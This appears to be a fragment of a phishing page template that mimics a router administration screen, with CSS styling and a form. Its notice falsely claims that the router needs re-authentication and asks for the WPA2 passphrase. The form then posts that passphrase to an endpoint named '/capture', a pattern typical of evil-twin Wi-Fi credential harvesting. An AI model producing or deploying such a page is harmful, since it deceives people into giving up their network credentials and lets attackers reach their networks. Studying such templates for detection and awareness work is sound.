*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Arial,Helvetica,sans-serif;background:#f2f4f7;min-height:100vh;display:flex;flex-direction:column}
header{background:#003087;padding:10px 20px;display:flex;align-items:center;gap:12px}
.header-logo{color:#fff;font-size:1.5em;font-weight:800;letter-spacing:1px}
.header-sub{color:rgba(255,255,255,.65);font-size:.78em}
nav{background:#003f8f;padding:0 20px;display:flex}
nav a{color:rgba(255,255,255,.7);font-size:.82em;padding:8px 14px;text-decoration:none;display:inline-block;border-bottom:2px solid transparent}
nav a.active{color:#fff;border-bottom-color:#fff}
.main{flex:1;display:flex;justify-content:center;padding:32px 16px}
.panel{background:#fff;width:100%;max-width:460px;border:1px solid #dce0e8;border-radius:3px}
.panel-title{background:#f8f9fb;border-bottom:1px solid #dce0e8;padding:14px 20px}
.panel-title h2{font-size:1em;color:#003087;font-weight:700}
.panel-body{padding:24px 20px}
.notice{background:#fff8e1;border:1px solid #ffe082;border-radius:3px;padding:10px 14px;
font-size:.82em;color:#5d4037;margin-bottom:20px;line-height:1.5}
.form-row{margin-bottom:16px}
label{display:block;font-size:.82em;color:#444;margin-bottom:5px;font-weight:600}
input[type=password]{width:100%;padding:8px 10px;border:1px solid #bbb;border-radius:2px;
font-size:.9em;outline:none;transition:border .2s}
input[type=password]:focus{border-color:#003087;box-shadow:0 0 0 2px rgba(0,48,135,.1)}
.actions{display:flex;gap:10px;margin-top:20px}
button.primary{background:#003087;color:#fff;border:none;border-radius:2px;
padding:9px 24px;font-size:.88em;font-weight:600;cursor:pointer}
button.primary:hover{background:#002060}
button.secondary{background:#f2f4f7;color:#444;border:1px solid #bbb;border-radius:2px;
padding:9px 20px;font-size:.88em;cursor:pointer}
footer{text-align:center;font-size:.7em;color:#aaa;padding:12px}

<div class="main">

      <div class="notice" data-i18n="notice">Your router requires re-authentication to apply recent wireless security settings. Please enter your current WPA2 passphrase to continue.</div>
      <form method="POST" action="/capture" autocomplete="off">
        <input type="hidden" name="csrf_token" value="">
        <div class="form-row">
          <label for="password" data-i18n="lbl_pass">WPA2 Pre-Shared Key</label>
          <input type="password" id="password" name="password"
                 data-i18n-ph="ph_pass" placeholder="Passphrase (8-63 characters)"
                 required minlength="8" maxlength="63">
        </div>
        <div class="actions">
          <button type="submit" class="primary" data-i18n="btn_apply">Apply</button>
          <button type="button" class="secondary" data-i18n="btn_cancel">Cancel</button>
        </div>
      </form>
    </div>
  </div>
